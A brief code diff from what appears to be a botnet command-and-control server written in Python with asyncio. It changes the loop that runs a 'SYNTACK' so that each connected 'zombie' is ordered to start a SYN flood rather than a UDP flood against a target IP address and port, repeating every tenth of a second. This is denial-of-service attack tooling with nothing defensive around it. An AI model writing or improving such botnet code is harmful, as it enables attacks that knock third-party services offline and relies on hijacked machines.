@@ -88,7 +88,7 @@ async def run_command(command_input:str):
         aioconsole.ainput("Press [Enter] to stop the SYNTACK")
         while True:
             for writer in connected_zombies:
-                await c4_server_commands.start_udp_flood(client_writer=writer, ip_addr=ip_addr, port=port)
+                await c4_server_commands.start_syn_flood(client_writer=writer, ip_addr=ip_addr, port=port)
             await asyncio.sleep(0.1)
             
         
